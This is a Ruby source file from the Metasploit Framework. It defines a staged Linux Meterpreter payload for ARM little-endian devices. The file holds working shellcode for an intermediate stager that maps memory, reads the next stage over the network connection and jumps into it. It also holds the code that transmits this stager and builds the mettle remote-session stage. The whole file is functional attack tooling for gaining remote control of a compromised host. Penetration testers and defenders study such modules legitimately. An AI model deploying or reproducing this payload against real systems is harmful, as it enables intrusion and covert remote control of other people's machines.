##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/base/sessions/meterpreter_armle_linux'
require 'msf/base/sessions/meterpreter_options'
require 'msf/base/sessions/mettle_config'
require 'rex/elfparsey'

module MetasploitModule
  include Msf::Sessions::MeterpreterOptions
  include Msf::Sessions::MettleConfig

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'          => 'Linux Meterpreter',
        'Description'   => 'Inject the mettle server payload (staged)',
        'Author'        => [
          'Adam Cammack <adam_cammack[at]rapid7.com>'
        ],
        'Platform'      => 'linux',
        'Arch'          => ARCH_ARMLE,
        'License'       => MSF_LICENSE,
        'Session'       => Msf::Sessions::Meterpreter_armle_Linux
      )
    )
  end

  def elf_ep(payload)
    elf = Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload))
    elf.elf_header.e_entry
  end

  def handle_intermediate_stage(conn, payload)
    entry_offset = elf_ep(payload)

    # Generated from external/source/shellcode/linux/armle/stage_mettle.s
    midstager = [
      0xe3a00000,         #  mov     r0, #0
      0xe59f1070,         #  ldr     r1, [pc, #112]  ; 0x100d0
      0xe3a02007,         #  mov     r2, #7
      0xe3a03022,         #  mov     r3, #34 ; 0x22
      0xe3a04000,         #  mov     r4, #0
      0xe3a05000,         #  mov     r5, #0
      0xe3a070c0,         #  mov     r7, #192        ; 0xc0
      0xef000000,         #  svc     0x00000000
      0xe1a02001,         #  mov     r2, r1
      0xe1a01000,         #  mov     r1, r0
      0xe1a0000c,         #  mov     r0, ip
      0xe3a03c01,         #  mov     r3, #256        ; 0x100
      0xe59f7048,         #  ldr     r7, [pc, #72]   ; 0x100d4
      0xef000000,         #  svc     0x00000000
      0xe3cdd00f,         #  bic     sp, sp, #15
      0xe28dd028,         #  add     sp, sp, #40     ; 0x28
      0xe3a0406d,         #  mov     r4, #109        ; 0x6d
      0xe52d4004,         #  push    {r4}            ; (str r4, [sp, #-4]!)
      0xe3a04002,         #  mov     r4, #2
      0xe1a0500d,         #  mov     r5, sp
      0xe1a0600c,         #  mov     r6, ip
      0xe3a07000,         #  mov     r7, #0
      0xe3a08000,         #  mov     r8, #0
      0xe3a09007,         #  mov     r9, #7
      0xe1a0a001,         #  mov     sl, r1
      0xe3a0b000,         #  mov     fp, #0
      0xe3a0c000,         #  mov     ip, #0
      0xe92d1ff0,         #  push    {r4, r5, r6, r7, r8, r9, sl, fp, ip}
      0xe59f000c,         #  ldr     r0, [pc, #12]   ; 0x100d8
      0xe0800001,         #  add     r0, r0, r1
      0xe12fff10,         #  bx      r0
      payload.length,
      0x00000123,         #  .word
      entry_offset
    ].pack('V*')

    vprint_status("Transmitting intermediate stager...(#{midstager.length} bytes)")
    conn.put([midstager.length].pack('V'))
    conn.put(midstager) == midstager.length
  end

  def generate_stage(opts = {})
    MetasploitPayloads::Mettle.new('armv5l-linux-musleabi',
      generate_config(opts.merge({scheme: 'tcp'}))).to_binary :process_image
  end
end
